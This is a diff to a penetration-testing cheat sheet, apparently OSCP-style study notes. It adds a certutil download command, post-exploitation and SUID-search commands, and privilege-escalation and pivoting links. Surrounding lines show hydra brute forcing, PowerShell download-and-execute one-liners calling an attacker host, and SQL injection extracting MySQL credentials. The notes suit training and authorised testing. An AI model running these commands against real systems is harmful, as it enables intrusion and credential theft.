@@ -23,6 +23,7 @@ Brute force login:
 hydra -s $RPORT -C ./SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -u -f $RHOST ftp
 ```
 https://book.hacktricks.xyz/pentesting/pentesting-ftp
+https://steflan-security.com/?p=2075
 
 
 ### SMTP - 25 TCP
@@ -167,6 +168,10 @@ nc -lp 8888 > outfile
 - powershell (New-Object Net.WebClient).downloadString('$LHOST/file', 'outfile') <- download to disk: need double check
 - powershell "IEX(New-Object Net.WebClient).downloadString('$LHOST/file')" <- download and exec on memory: need double check
 ```
+### Certutil
+```
+certutil.exe -urlcache -split -f "$RHOST" outfile.zip
+```
 
 
 ## Reverse Shell
@@ -264,6 +269,20 @@ php?xxx=9999999 union select 1,(select group_concat(host,user,password) FROM mys
 ```
 
 
+## Post Exploitation
+Check for current running processes:
+```
+ps aux
+```
+Check for current network connections:
+```
+ss -lntp
+```
+Check for interesting files:
+ssh keys, logs file (if got permission), /etc/passwd, /opt, cronjob
+
+
+
 
 ## Some notes:
 Member of (adm) group can read log files
@@ -274,6 +293,15 @@ PHP: phtml, php3, php4, php5, .inc
 ASP: aspx
 PERL: pl, .cgi, .lib
 JSP: jspx, jsw, jsv, jspf
+
+Find all SUID files:
+```
+find / -perm /4000 -exec ls -l {} \; 2>/dev/null
+```
+Find all files owned by an user:
+```
+find / -username -exec ls -l {} \; 2>/dev/null
+```
 
 ### Hashcat:
 Use hashcat rule to generate a list of variation of a common word:
@@ -314,7 +342,9 @@ cat sig shell.php > newshell.php
 Upload and modify POST request with Burp
 
 
-
+## Pivoting
+https://sushant747.gitbooks.io/total-oscp-guide/content/port_forwarding_and_tunneling.html
+https://github.com/21y4d/Notes/blob/master/Pivoting.txt
  
 
 
@@ -322,14 +352,27 @@ Upload and modify POST request with Burp
 ```diff
 - WIP
 ```
-
-
+https://gtfobins.github.io/
+https://casvancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/#privilege-escalation
+LinPEAS.sh
+https://github.com/sagishahar/lpeworkshop
+https://in.security/lin-security-walkthrough/
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+https://steflan-security.com/?p=283
+https://book.hacktricks.xyz/linux-unix/privilege-escalation
 
 
 ## Windows Privilege Escaltion
 ```diff
 -WIP
 ```
-
-
+Nishang
+https://github.com/M4ximuss/Powerless
+https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
+https://casvancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/#privilege-escalation
+WinPEAS.exe
+https://github.com/sagishahar/lpeworkshop
+https://github.com/411Hall/JAWS
+https://steflan-security.com/?p=474
+http://www.fuzzysecurity.com/tutorials/16.html
 
